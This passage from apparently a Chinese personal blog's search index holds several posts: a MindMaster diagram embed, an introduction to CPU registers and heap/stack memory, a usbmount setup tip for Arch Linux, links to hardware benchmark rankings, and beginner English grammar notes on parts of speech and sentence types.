<h4 id="MindMaster"><a href="#MindMaster" class="headerlink" title="MindMaster"></a>MindMaster</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;iframe frameborder=<span class="string">&quot;no&quot;</span> border=<span class="string">&quot;0&quot;</span> marginwidth=<span class="string">&quot;0&quot;</span> marginheight=<span class="string">&quot;0&quot;</span> width=800 height=800 src=<span class="string">&quot;xxxxxxxxxxxxxxx&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<p><strong>例</strong>：</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="800" height="800" src="https://edrawcloudpubliccn.oss-cn-shenzhen.aliyuncs.com/viewer/self/1198898/share/2019-9-23/1569199487/main.svg"></iframe>


]]></content>
      <tags>
        <tag>思维导图</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编基础</title>
    <url>/posts/84aee333/</url>
    <content><![CDATA[<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>CPU 只负责运算，不负责存储数据，而数据都存储在磁盘中，磁盘速度无法满足运算时的速度，因此需要将数据先读取到内存中，CPU 需要的时候就去内存中读取，但 CPU 的运算速度远高与内存的读写速度，为避免被拖慢，CPU 都会自带一级、二级甚至三级缓存。基本上，CPU 缓存可看作是读写速度较快的内存。</p>
<p>但是，CPU 缓存的速度还是不够块，数据在缓存中的地址也是不固定的，CPU 每次读写都需要寻址也会拖慢速度。因此，CPU 自带寄存器(register) 用来存储常用的数据。CPU 优先读写寄存器，再由寄存器与内存交换数据。</p>
<p>寄存器 <strong>不依靠地址</strong> 来区分数据，而<strong>依靠名称</strong>。<strong>每一个寄存器都有自己的名称</strong>，通过告诉 CPU 去具体的哪个寄存器读写数据，这样速度是最快的。寄存器被比喻成零级缓存。</p>
<a id="more"></a>
<h2 id="寄存器总类"><a href="#寄存器总类" class="headerlink" title="寄存器总类"></a>寄存器总类</h2><p>早期 <code>x86 CPU</code> 只有 8 个寄存器，每个都有不同用途，现在的寄存器已经有一百多个了，都变成了通用寄存器，不特别指定用途，但早期寄存器的名字被保留了下来。</p>
<ul>
<li><code>EAX</code></li>
<li><code>EBX</code></li>
<li><code>ECX</code></li>
<li><code>EDX</code></li>
<li><code>EDI</code></li>
<li><code>ESI</code></li>
<li><code>EBP</code></li>
<li><code>ESP</code></li>
</ul>
<p>以上 8 个寄存器中，前 7 个都是通用的， <code>ESP</code> 寄存器有特殊用途，用于保存 Stack (栈) 的地址。</p>
<p>32 位 CPU 、64 位 CPU 指的是寄存器的大小，32 位 CPU 的寄存器大小是 <code>32 Bit</code> (4 Byte), 64 位 CPU 的寄存器是 <code>64 Bit</code> (8 Byte)。</p>
<ul>
<li><p><code>1 Byte</code> = <code>8 Bit</code> (<code>1 B = 8 b</code>)。</p>
</li>
<li><p>一字节代表八个比特(八个二进制位)。</p>
</li>
</ul>
<h1 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h1><p>寄存器只能存放很少量的数据，大多数时候, CPU 需要指挥寄存器直接与内存交换数据。而内存存储数据使用的是<code>Heap</code> (堆) 和 <code>Stack</code> (栈) 两种模型进行存储。</p>
<h2 id="Heap-堆"><a href="#Heap-堆" class="headerlink" title="Heap (堆)"></a>Heap (堆)</h2><p>程序启动时，系统会给程序分配一段内存，用来存储程序和运行产生的数据，这段内存具有地址较低的起始地址和地址较高结束地址。</p>
<p>程序运行中，对于动态的内存占用请求(如新建对象),系统会从程序启动时分配的内存段中，从起始地址开始划分出请求大小的内存段来给用户，若需要更多内存段，则从前面的结束地址开始再堆积。</p>
<p>这种由用户主动请求划分出来的内存区域叫 <code>Heap</code> (堆) ，它由起始地址开始从低位地址向高位地址增长，<code>Heap</code> 的一个重要特定就是不会自动消失，必须手动释放，或由垃圾回收机制来回收。</p>
<h2 id="Stack-栈"><a href="#Stack-栈" class="headerlink" title="Stack (栈)"></a>Stack (栈)</h2><p><code>Stack</code> (栈) 是函数运行而临时占用的内存区域。系统开始执行函数时，会在分配给程序的内存段中建立一个帧 (<code>frame</code>) ，函数中所有的内部变量都会保存在这个帧中，函数结束时这个帧会被回收，释放所有内部的变量，不再占用空间。</p>
<p>当函数调用另一个函数时，执行到调用函数时，系统会新建一个帧用于存储新函数的内部变量，这时就同时存在两个帧。一般来说，调用栈有多少层，就有多少帧。当被调用函数运行结束，它的帧就会被回收，系统会回到原函数中断执行的地方，继续往下执行。这种机制实现了函数的层层调用，且每层都能使用自己的本地变量。</p>
<p>所有的帧都存放在 <code>Stack</code> ，由于帧是一层层的堆叠，所以 Stack 被译为具有存储属性还有堆叠特定的 <code>栈</code>。生成新帧，叫 <code>入栈</code> (<code>push</code>) ，栈的回收叫 <code>出栈</code> (<code>pop</code>) 。Stack 的特定就是 后入栈的先出栈(最内层的函数调用，最先结束运行) ,这就是 <code>后进先出</code> 的数据结构。每一次函数执行结束就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放完。</p>
<p>Stack 由内存区的结束地址开始，从高地址向低地址分配，当新的帧产生时新帧地址会往低地址方向移动。</p>
<h3 id="Stack-为什么叫栈"><a href="#Stack-为什么叫栈" class="headerlink" title="Stack 为什么叫栈"></a>Stack 为什么叫栈</h3><p>Heap 在词典中翻译 <code>n. 堆,许多 ; vt. 使成堆</code> , Stack 在词典中翻译为 <code>n. 堆,叠,垛 ; v. 堆积</code> ,内存模型为什么要将 Heap 译为 <code>堆</code> , Stack 译为 <code>栈</code> ? 内存模型又为什么选择 Heap 和 Stack 来描述内存模型?</p>
<ul>
<li><code>堆</code> 在中文字典中解释为: <code>累积在一起的东西</code></li>
<li><code>栈</code> 在中文词典汇解释为: <code>存储货物或提供旅客住宿的房屋</code>。</li>
<li>Heap 在<a href="https://www.ldoceonline.com/">朗文英语词典</a>中解释为 <code>a large untidy pile of things</code> (一堆乱七八糟的东西) ，是物品的堆积。</li>
<li>Stack 在朗文英语词典中解释为 <code>a neat pile of things</code> (一堆整齐的东西) ，是整齐的堆叠。</li>
</ul>
<p>为了区分这两 <code>堆</code> 从而找的相近的词 <code>栈</code> 来描述 Stack 。而内存模型中选择 Heap 和 Stack 来描述内存模型则是因为两个模型的特性的，杂乱的堆积和整齐的堆叠,存储货物的栈就是整齐的堆叠。</p>
<h2 id="内存模型中的堆栈与数据结构中的堆栈"><a href="#内存模型中的堆栈与数据结构中的堆栈" class="headerlink" title="内存模型中的堆栈与数据结构中的堆栈"></a>内存模型中的堆栈与数据结构中的堆栈</h2><h3 id="内存模型中的堆栈"><a href="#内存模型中的堆栈" class="headerlink" title="内存模型中的堆栈"></a>内存模型中的堆栈</h3><ul>
<li>堆区 : 从低地址向高地址划分，程序按需分配，需要手动释放</li>
<li>栈区 : 从高地址向低地址划分，函数调用自动扩展，自动回收</li>
</ul>
<h3 id="数据结构中的堆栈"><a href="#数据结构中的堆栈" class="headerlink" title="数据结构中的堆栈"></a>数据结构中的堆栈</h3><ul>
<li>堆 : 一颗完全二叉数结构，特点是父节点的值大于(小于)两个子节点的值(称为大(小)顶堆)，常用于算法执行过程中的信息，应用场景: 堆排序、优先队列等。</li>
<li>栈 : 一种连续存储的数据结构，特点是存储的数据先进后出，后进先出。</li>
</ul>
<h1 id="CPU-指令"><a href="#CPU-指令" class="headerlink" title="CPU 指令"></a>CPU 指令</h1><p>汇编语言的内容就是一条条的 CPU 指令,通过 CPU 指令完成对数据的处理运算。</p>
<p>常见 CPU 指令集：</p>
<ul>
<li>复杂指令集(CISC): x86、AMD64</li>
<li>精简指令集(RISC): Alpha、MIPS、ARM、SPARC、PA-RISC</li>
<li>显示并发指令集(EPIC): IA-64</li>
</ul>
<h2 id="一些指令"><a href="#一些指令" class="headerlink" title="一些指令"></a>一些指令</h2><ul>
<li>push</li>
<li>call</li>
<li>mov</li>
<li>add</li>
<li>pop</li>
<li>ret</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html">汇编语言入门教程</a></p>
<p><a href="https://drinking.github.io/stack-and-heap">既生堆何生栈</a></p>
<p><a href="https://blog.csdn.net/qq_41786318/article/details/81949282">内存中的堆栈和数据结构堆栈区别</a></p>
]]></content>
  </entry>
  <entry>
    <title>自动挂载U盘等外部存储</title>
    <url>/posts/a221ab0a/</url>
    <content><![CDATA[<p>自动挂载U盘等外部存储位置,需要安装<code>usbmount</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S usbmount</span><br></pre></td></tr></table></figure>
<p>配置<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/usbmount/usbmount.conf</span><br><span class="line"><span class="comment"># 在MOUNTOPTIONS那行添加user即可使普通用户也对挂载的U盘拥有写权限, 如下: MOUNTOPTIOS=&quot;rw,user,noatime,nodiratime&quot;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>自动</tag>
      </tags>
  </entry>
  <entry>
    <title>电脑配件排行榜</title>
    <url>/posts/4b2b9ac7/</url>
    <content><![CDATA[<p><a href="https://www.passmark.com/">passmark主站</a></p>
<p><a href="http://diy.zol.com.cn/">中关村DIY</a></p>
<p><a href="https://diy.pconline.com.cn/">太平洋DIY</a></p>
<p><a href="http://tieba.baidu.com/p/6420786616?see_lz=1">贴吧<code>花飞青天揽明月</code>的处理器及显卡天梯图</a>（<strong>包含桌面和笔记本,推荐</strong>）</p>
<a id="more"></a>
<h1 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h1><ul>
<li><p><a href="https://www.cpubenchmark.net/">CPU passmark主站</a></p>
</li>
<li><p><a href="https://www.cpubenchmark.net/high_end_cpus.html">高端CPU</a></p>
</li>
<li><p><a href="https://www.cpubenchmark.net/mid_range_cpus.html">中高端CPU</a></p>
</li>
<li><p><a href="https://www.cpubenchmark.net/midlow_range_cpus.html">中低端CPU</a></p>
</li>
<li><p><a href="https://www.cpubenchmark.net/low_end_cpus.html">低端CPU</a></p>
</li>
<li><p><a href="http://cdn.malu.me/cpu/">CPU性能天梯表</a></p>
</li>
<li><p><a href="https://www.mydrivers.com/zhuanti/tianti/cpu/index.html">桌面处理器天梯图</a></p>
</li>
<li><p><a href="https://diy.pconline.com.cn/tiantitu/cpu/">太平洋电脑桌面处理器天梯图</a></p>
</li>
<li><p><a href="https://topic.expreview.com/CPU/">超能网处理器天梯图</a></p>
</li>
<li><p><a href="https://cpu.zol.com.cn/soc/">中关村处理器天梯图</a></p>
</li>
<li><p><a href="http://www.mydrivers.com/zhuanti/tianti/01/index.html">手机处理器天梯图</a></p>
</li>
<li><p>贴吧<code>花飞青天揽明月</code>更新「CPU天梯图v2.0.3 20200221中国加油」<br><a href="https://imgchr.com/i/32sPEV"><img data-src="https://s2.ax1x.com/2020/03/01/32sPEV.png" alt="32sPEV.png"></a></p>
</li>
</ul>
<h1 id="GPU"><a href="#GPU" class="headerlink" title="GPU"></a>GPU</h1><ul>
<li><p><a href="https://www.videocardbenchmark.net/">GPU passmark主站</a></p>
</li>
<li><p><a href="https://www.videocardbenchmark.net/high_end_gpus.html">高端GPU</a></p>
</li>
<li><p><a href="https://www.videocardbenchmark.net/mid_range_gpus.html">中高端GPU</a></p>
</li>
<li><p><a href="https://www.videocardbenchmark.net/midlow_range_gpus.html">中低端GPU</a></p>
</li>
<li><p><a href="https://www.videocardbenchmark.net/low_end_gpus.html">低端GPU</a></p>
</li>
<li><p><a href="http://cdn.malu.me/gpu/">GPU性能天梯表</a></p>
</li>
<li><p><a href="https://www.mydrivers.com/zhuanti/tianti/gpu/index.html">桌面显卡天梯图</a></p>
</li>
<li><p><a href="https://topic.expreview.com/GPU/">超能网显卡天梯图</a></p>
</li>
<li><p><a href="http://vga.zol.com.cn/soc/">中关村显卡天梯图</a></p>
</li>
<li><p>贴吧<code>花飞青天揽明月</code>更新「显卡天梯图v5.3.5 20200221中国加油」<br><a href="https://imgchr.com/i/32siNT"><img data-src="https://s2.ax1x.com/2020/03/01/32siNT.png" alt="32siNT.png"></a></p>
</li>
</ul>
<h1 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h1><ul>
<li><p><a href="https://www.harddrivebenchmark.net/">硬盘passmark主站</a></p>
</li>
<li><p><a href="https://www.harddrivebenchmark.net/high_end_drives.html">高端硬盘</a></p>
</li>
<li><p><a href="https://www.harddrivebenchmark.net/mid_range_drives.html">中高端硬盘</a></p>
</li>
<li><p><a href="https://www.harddrivebenchmark.net/low_mid_range_drives.html">中低端硬盘</a></p>
</li>
<li><p><a href="https://www.harddrivebenchmark.net/low_end_drives.html">低端硬盘</a></p>
</li>
<li><p><a href="http://cdn.malu.me/hard/">硬盘性能天梯表</a></p>
</li>
<li><p><a href="https://m.zol.com.cn/ssd/soc.html">中关村硬盘天梯图</a></p>
</li>
</ul>
<h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><ul>
<li><a href="https://www.memorybenchmark.net/">内存passmark主站</a></li>
</ul>
<h1 id="电源"><a href="#电源" class="headerlink" title="电源"></a>电源</h1><ul>
<li><a href="http://power.zol.com.cn/soc/">中关村电源天梯图</a></li>
</ul>
]]></content>
      <tags>
        <tag>排行榜</tag>
      </tags>
  </entry>
  <entry>
    <title>英语语法冲入门掉入坑day01</title>
    <url>/posts/ea5721f7/</url>
    <content><![CDATA[<h1 id="10种词性"><a href="#10种词性" class="headerlink" title="10种词性"></a>10种词性</h1><p><strong>很多单词有多个词性，不同情况下使用不同词性</strong></p>
<ul>
<li>noun (名词)</li>
<li>pronoun (代词)</li>
<li>numeral (数词)</li>
<li>article (冠词)</li>
<li>varb (动词)</li>
<li>adverb (副词)</li>
<li>adjective (形容词)</li>
<li>preposition (介词)</li>
<li>conjunction (连词)</li>
<li>interjection (感叹词)</li>
</ul>
<a id="more"></a>
<h2 id="noun-名词-n"><a href="#noun-名词-n" class="headerlink" title="noun (名词) n."></a>noun (名词) <code>n.</code></h2><p><strong>东西叫什么就是名词</strong></p>
<p>例：apple、cat、China</p>
<h2 id="pronoun-代词-pron"><a href="#pronoun-代词-pron" class="headerlink" title="pronoun (代词) pron."></a>pronoun (代词) <code>pron.</code></h2><p><strong>可以代替名词、名词性短语的一种词</strong></p>
<p>例：we、that、all、who</p>
<h2 id="numeral-数词-num"><a href="#numeral-数词-num" class="headerlink" title="numeral (数词) num."></a>numeral (数词) <code>num.</code></h2><p><strong>数词就是数字</strong></p>
<p>列：one、疼、fifty、hundred</p>
<h2 id="article-冠词-art"><a href="#article-冠词-art" class="headerlink" title="article (冠词) art."></a>article (冠词) <code>art.</code></h2><p><strong>加在名词/名词词组前后的词，冠词只有以下几个</strong></p>
<p>不定冠词：<code>a</code>、<code>an</code><br>定冠词：<code>the</code><br>表量冠词：<code>some</code></p>
<h2 id="verb-动词-v"><a href="#verb-动词-v" class="headerlink" title="verb (动词) v."></a>verb (动词) <code>v.</code></h2><p><strong>表示动作的词</strong></p>
<p>例：get、do、play</p>
<h2 id="adverb-副词-adv"><a href="#adverb-副词-adv" class="headerlink" title="adverb (副词) adv."></a>adverb (副词) <code>adv.</code></h2><p><strong>副词是用于修饰动词或加强描绘 词组/整个句子 的词</strong></p>
<p>修饰动词用于给<strong>动作增加别的属性</strong></p>
<p>例：next、much、back</p>
<h2 id="adjective-形容词-adj"><a href="#adjective-形容词-adj" class="headerlink" title="adjective (形容词) adj."></a>adjective (形容词) <code>adj.</code></h2><p><strong>修饰名词的词</strong></p>
<p>例：good、fast、hot</p>
<h2 id="preposition-介词-prep"><a href="#preposition-介词-prep" class="headerlink" title="preposition (介词) prep."></a>preposition (介词) <code>prep.</code></h2><p><strong>介于名词代词等词之间的词叫介词，用来关联词与词之间的文法关系，没有实际意义</strong></p>
<p>介词前是与介词搭配的词，可能是动词、名词或形容词介词，宾语一般放在后面。宾语的形式主要是名词，还有相当于名词的代词、数词、动名词及名词性从句等</p>
<p>例：at、in、on</p>
<h2 id="conjunction-连词-conj"><a href="#conjunction-连词-conj" class="headerlink" title="conjunction (连词) conj."></a>conjunction (连词) <code>conj.</code></h2><p><strong>用来连接词语、短语、句子、段落等的词，形成逻辑关系、语法结构等关系</strong></p>
<p>例：and、also、but、</p>
<h2 id="interjection-感叹词-int"><a href="#interjection-感叹词-int" class="headerlink" title="interjection (感叹词) int."></a>interjection (感叹词) <code>int.</code></h2><p><strong>用于表达各种感情的词，一般与句子本身没有实际联系</strong></p>
<p>例：what、yum、blah</p>
<h1 id="9种成分"><a href="#9种成分" class="headerlink" title="9种成分"></a>9种成分</h1><ul>
<li>subject (主)</li>
<li>predicate (谓)</li>
<li>object (宾)</li>
<li>attribute (定语)</li>
<li>adverbial (状语)</li>
<li>object complement (宾补)</li>
<li>subject complement (表语)</li>
<li>double object (双宾)</li>
<li>apposition (同位)</li>
</ul>
<h1 id="8种句型"><a href="#8种句型" class="headerlink" title="8种句型"></a>8种句型</h1><h2 id="简单句"><a href="#简单句" class="headerlink" title="简单句"></a>简单句</h2><ul>
<li>主 <code>+</code> 谓</li>
<li>主 <code>+</code> 谓 <code>+</code> 宾</li>
<li>主 <code>+</code> 系 <code>+</code> 表</li>
<li>主 <code>+</code> 谓 <code>+</code> 双宾</li>
<li>主 <code>+</code> 谓 <code>+</code> 宾 <code>+</code> 宾补</li>
</ul>
<h2 id="复合句-从句"><a href="#复合句-从句" class="headerlink" title="复合句(从句)"></a>复合句(从句)</h2><ul>
<li>名词性从句</li>
<li>定语从句</li>
<li>状语从句</li>
</ul>
<h1 id="简单句-1"><a href="#简单句-1" class="headerlink" title="简单句"></a>简单句</h1><ul>
<li>陈述句</li>
<li>疑问句</li>
<li>感叹句</li>
<li>祈使句</li>
</ul>
<h2 id="陈述句"><a href="#陈述句" class="headerlink" title="陈述句"></a>陈述句</h2><p><strong>描述一个东西、事实，把一个东西给陈述出来</strong></p>
<p>陈述句分两种：</p>
<ul>
<li>肯定式</li>
<li>否定式</li>
</ul>
<p><strong>肯定变否定：助动词(<code>do</code>)后加否定词(<code>not</code>)</strong></p>
<p>例：<br>肯：<code>I have money</code><br>否：<code>I don&#39;t(do not) have money</code></p>
<h3 id="陈述句5种句型"><a href="#陈述句5种句型" class="headerlink" title="陈述句5种句型"></a>陈述句5种句型</h3><ul>
<li>主 <code>+</code> 谓</li>
<li>主 <code>+</code> 谓 <code>+</code> 宾</li>
<li>主 <code>+</code> 系 <code>+</code> 表</li>
<li>主 <code>+</code> 谓 <code>+</code> 双宾</li>
<li>主 <code>+</code> 谓 <code>+</code> 宾补</li>
</ul>
<h3 id="主-谓"><a href="#主-谓" class="headerlink" title="主 + 谓"></a>主 <code>+</code> 谓</h3><p><strong>不及物动词才能玩主谓结构</strong></p>
<p><code>I run</code> (我 跑)</p>
<p><strong>谓语用于描述主语的状态和动作</strong></p>
<h3 id="主-谓-宾"><a href="#主-谓-宾" class="headerlink" title="主 + 谓 + 宾"></a>主 <code>+</code> 谓 <code>+</code> 宾</h3><p><strong>宾语就是动作的接受者</strong></p>
<p><code>I love you</code> (我 爱 你)</p>
<h3 id="主-系-表"><a href="#主-系-表" class="headerlink" title="主 + 系 + 表"></a>主 <code>+</code> 系 <code>+</code> 表</h3><p>系动词 <code>=</code> be动词 <code>+</code> 感官动词</p>
<ul>
<li>be动词：一堆各种各样的是 <code>am</code>、<code>is</code>、<code>are</code>等等</li>
<li>感官动词：看、听、闻、尝、感觉、变得、似乎、保持、证明</li>
</ul>
<p>句子中间的谓语动词，如果是系动词后面的就是表</p>
<p><code>I am Iron Man</code> (我 是 钢铁侠)</p>
<h3 id="主-谓-双宾-直接宾语-间接宾语"><a href="#主-谓-双宾-直接宾语-间接宾语" class="headerlink" title="主 + 谓 + 双宾(直接宾语+间接宾语)"></a>主 <code>+</code> 谓 <code>+</code> 双宾(直接宾语<code>+</code>间接宾语)</h3><p><code>I give you money</code> (我 给 你 钱)<br>双宾表示谓语后加的两个东西，都是动作的对象<br><code>我 给 (你+钱)</code></p>
<p><strong>判断技巧：谓语后的两个东西，都能做被动语态主语的就是双宾，否则就是宾补</strong></p>
<p><code>我给(你+钱) = (你)被我给了(钱) = (钱)被我给了(你)</code></p>
<h3 id="主-谓-宾-宾补"><a href="#主-谓-宾-宾补" class="headerlink" title="主 + 谓 + 宾 + 宾补"></a>主 <code>+</code> 谓 <code>+</code> 宾 <code>+</code> 宾补</h3><p>和宾补一样都是谓语后有两个东西，但两个中只有一个能做被动语态主语</p>
<p><code>Thery ordered hamburger theit lunch</code> (他们 点了 汉堡 他们的午餐)<br>他们的午餐他们点了汉堡</p>
<p><strong>判断技巧：谓语后的两个东西，都能做被动语态主语的就是双宾，否则就是宾补</strong></p>
<p>他们 点了 (汉堡+他们的午餐)</p>
<p>(汉堡)被他们点了(他们的午餐) 说不通，被人点菜给汉堡吃？<br>(他们的午餐) 被他们点了(汉堡) 说的痛</p>
<h2 id="疑问句"><a href="#疑问句" class="headerlink" title="疑问句"></a>疑问句</h2><ul>
<li>一般疑问句</li>
<li>特殊疑问句</li>
<li>选择疑问句</li>
<li>反义疑问句</li>
</ul>
<h3 id="一般疑问句"><a href="#一般疑问句" class="headerlink" title="一般疑问句"></a>一般疑问句</h3><p><strong>可用<code>yes</code>，<code>no</code>回答的</strong></p>
<p><strong>陈述句变一般疑问句</strong>三种方式：</p>
<ul>
<li><p><strong>提前系动词</strong> (be动词、感官动词)</p>
<p>  主+系+表 <code>变</code> 系+主+表</p>
<p>  陈述句：<code>You (are) an idiot.</code> (你是个笨蛋)<br>  一般疑问句：<code>(Are) you an idiot?</code> (你是不是笨蛋)<br>  回答：<code>Yes,I am/No,I&#39;m not.</code></p>
</li>
<li><p><strong>提前助动词</strong> (do、have、shall等)</p>
<p>  主+谓+ (宾) <code>变</code> 助动词+主+动词原型+其他</p>
<p>  陈述句：You (have) got light bulbs. (你有灯泡)<br>  一般疑问句：(Have) you got light bulbs? (你有灯泡吗？)<br>  回答：Yes,I have/No,I haven’t</p>
</li>
<li><p><strong>提前情态动词</strong> (can、may、will等)</p>
<p>  主+情态动词+动词原型+其他 <code>变</code> 情态动词+主+动词原型+其他</p>
<p>  陈述句：You (can) play football. (你会踢足球)<br>  一般疑问句：(Can) you play footall? (你会踢足球吗？)<br>  回答：Yes,I can/No,I can’t</p>
</li>
</ul>
<h3 id="特殊疑问句"><a href="#特殊疑问句" class="headerlink" title="特殊疑问句"></a>特殊疑问句</h3><p><strong>不能用<code>yes</code>,<code>no</code>回答；对句子中的某个成分提问，用特殊疑问词开头</strong></p>
<h4 id="特殊疑问句的疑问词："><a href="#特殊疑问句的疑问词：" class="headerlink" title="特殊疑问句的疑问词："></a>特殊疑问句的疑问词：</h4><ul>
<li><code>Who</code>     提问人：Who’s next? (谁下一个？)</li>
<li><code>Whose</code>     提问所属：Whose car is this? (这是谁的车？)</li>
<li><code>Whom</code>     提问宾格人：Whom did you choose for our them leader? (你选谁当我们队长？)</li>
<li><code>What</code>     提问事情属性：What time is it? (几点了？)</li>
<li><code>When</code>     提问时间：When can we start working? (我们什么时候可以开始工作？)</li>
<li><code>Where</code>     提问地点：Where is the bathroom? (卫生间在哪里？)</li>
<li><code>Why</code>     提问原因：Why did he do it? (他为什么做这个事？)</li>
<li><code>How</code>     提问方式数量：How heavy is it? (它有多重？)</li>
<li><code>How much/many</code>     多少：How much longer? (有多远？)</li>
<li><code>Which</code>     提问选择：Which is your choice? (你选哪个？)</li>
</ul>
<h3 id="选择疑问句"><a href="#选择疑问句" class="headerlink" title="选择疑问句"></a>选择疑问句</h3><p><strong>不可用<code>yes</code>、<code>no</code>回答；选择疑问句一般用or连接，提问两个以上的句子内容供选择</strong></p>
<p><code>Do you like to play football or basketaball?</code> (你喜欢踢足球还是打篮球？)<br>回答：<code>I like to play football/I like to play basketball</code></p>
<h3 id="反义疑问句"><a href="#反义疑问句" class="headerlink" title="反义疑问句"></a>反义疑问句</h3><p><strong>可以用<code>yes</code>、<code>no</code>回答；前肯后否，前否后肯</strong></p>
<p>陈述句部分是肯定，疑问句部分有个否定句<br><code>He is your teacher,isn&#39;t he?</code> (他是你的老师，不是吗？)</p>
<p>陈述句部分是否定，疑问句部分用肯定句<br><code>He isn&#39;t your teacher,is he?</code> (他不是你的老师，是吗？)</p>
<p><strong>根据事实</strong>回答:<code>Yes,he is/No,he isn&#39;t</code></p>
<h4 id="祈使句反义疑问句"><a href="#祈使句反义疑问句" class="headerlink" title="祈使句反义疑问句"></a>祈使句反义疑问句</h4><p><strong>用<code>will you</code>和<code>won&#39;t you</code>的句子</strong></p>
<p><code>Open the door,won&#39;t you?</code> (打开门，不好吗？)<br><code>Don&#39;t open the door,will you?</code> (不打开门，好吗？)</p>
<p><strong>不管否定肯定，<code>let&#39;s</code>开头结尾就是<code>shall we</code>,<code>Let us</code>开头结尾就是<code>will you</code></strong></p>
<p>肯定：<code>Let&#39;s go to school,shall we?</code> <code>Let us go outside ,will you?</code><br>否定：<code>Let&#39;s don&#39;t go out,shall we?</code> <code>Don&#39;t let us go there,will you?</code></p>
<h4 id="有must反义疑问句"><a href="#有must反义疑问句" class="headerlink" title="有must反义疑问句"></a>有<code>must</code>反义疑问句</h4><p><strong>must表必须时，反义疑问用<code>mustn&#39;t?/needn&#39;t?</code></strong></p>
<p><code>He must study hard at English,mustn&#39;t he?</code> (他必须努力学英语，不是吗？)</p>
<p><strong>must表推测(肯定的)时，反义疑问句用must后动词的否定提问</strong></p>
<p><code>You must be joking,aren&#39;t you?</code> (你肯定是在开玩笑，不是吗？)</p>
<h4 id="感叹句反义疑问句"><a href="#感叹句反义疑问句" class="headerlink" title="感叹句反义疑问句"></a>感叹句反义疑问句</h4><p><strong>含有感叹句的反义疑问句，全部用感叹句陈述，用否定式提问(前肯后否)</strong></p>
<p><code>What a lovely girl,isn&#39;t she?</code> (多么可爱的女孩，不是吗？)</p>
<h4 id="含否定词的反义疑问句"><a href="#含否定词的反义疑问句" class="headerlink" title="含否定词的反义疑问句"></a>含否定词的反义疑问句</h4><p><strong>常见否定词：<code>hardly</code>、<code>never</code>、<code>seldom</code>、<code>little</code>、<code>few</code>、<code>nowhere</code>、<code>nothing</code></strong></p>
<p><strong>陈述句有否定词，反义疑问用肯定提问</strong><br><code>He hardly goes to school,does he?</code> (他几乎不去学校，是吗？)</p>
<h4 id="含复合句的反义疑问句"><a href="#含复合句的反义疑问句" class="headerlink" title="含复合句的反义疑问句"></a>含复合句的反义疑问句</h4><p>复合句反义疑问都是对主句提问与主句相关(除宾语从句)</p>
<p><code>She never told you that she had a baby,did she?</code> (她从来没有告诉过你她有一个孩子，是吗？)</p>
<h4 id="含宾语从句的反义疑问句"><a href="#含宾语从句的反义疑问句" class="headerlink" title="含宾语从句的反义疑问句"></a>含宾语从句的反义疑问句</h4><p><strong>全部复合句里，只有宾语从句的反义疑问句，是和从句相关的</strong></p>
<p><code>I don&#39;t think/believe/imagine/suppose</code>引导的宾语从句，反义疑问句与从句主语，主谓一致，用肯定提问</p>
<p><code>I don&#39;t imagine he has got it,has he?</code> (我没有想过有它，他有吗？)</p>
<h2 id="感叹句"><a href="#感叹句" class="headerlink" title="感叹句"></a>感叹句</h2><h3 id="What-感叹句"><a href="#What-感叹句" class="headerlink" title="What 感叹句"></a><code>What</code> 感叹句</h3><ul>
<li><strong>What <code>+</code> a/an <code>+</code> 形容词 <code>+</code> 可数名词单数 <code>+</code> 主语 <code>+</code> 谓语</strong></li>
</ul>
<p><code>What a beautiful photo it is!</code> (这照片它多美啊！)</p>
<ul>
<li><strong>What <code>+</code> 形容词 <code>+</code> 不可数名词/名词复数 <code>+</code> 主语 <code>+</code> 谓语</strong></li>
</ul>
<p><code>What cleanly water it is!</code> (多干净的水啊！)<br><code>What brilliant dogs they are!</code> (多聪明的狗啊！)</p>
<h3 id="How-感叹句"><a href="#How-感叹句" class="headerlink" title="How 感叹句"></a><code>How</code> 感叹句</h3><ul>
<li><p><strong>How <code>+</code> 形容词/副词 <code>+</code> 主语 <code>+</code> 谓语</strong><br><code>How careful he is!</code> (他多细心啊！)<br><code>How fast he runs!</code> (他跑得多快啊！)</p>
</li>
<li><p><strong>How <code>+</code> 形容词 <code>+</code> a/an <code>+</code> 可数名词单数 <code>+</code> 主语 <code>+</code> 谓语</strong><br><code>How cute a dog it is!</code> (它是多么可爱的一条狗啊！)</p>
</li>
</ul>
<h3 id="语气词-感叹号的感叹句"><a href="#语气词-感叹号的感叹句" class="headerlink" title="语气词+感叹号的感叹句"></a>语气词+感叹号的感叹句</h3><p><code>Wow! That&#39;s totally awesome!</code> (哇！真是厉害！)</p>
<p><code>Oh! You&#39;re Peter!</code> (哇！你是皮特！)</p>
<h2 id="祈使句"><a href="#祈使句" class="headerlink" title="祈使句"></a>祈使句</h2><h3 id="命令、警告祈使句"><a href="#命令、警告祈使句" class="headerlink" title="命令、警告祈使句"></a>命令、警告祈使句</h3><p><code>Get out!</code> (滚！)<br><code>Be quiet,please.</code> (请安静)<br><code>Be careful</code> (小心)</p>
<h3 id="请求、祝愿祈使句"><a href="#请求、祝愿祈使句" class="headerlink" title="请求、祝愿祈使句"></a>请求、祝愿祈使句</h3><p><code>Have a good day</code> (祝你有美好的一天)<br><code>Let me help you</code> (让我帮你)</p>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>英语语法冲入门掉入坑day02</title>
    <url>/posts/735e704d/</url>
    <content><![CDATA[<p><a href="https://www.bilibili.com/video/av66639463">学习出处</a></p>
<h1 id="数词"><a href="#数词" class="headerlink" title="数词"></a>数词</h1><ul>
<li>基数词</li>
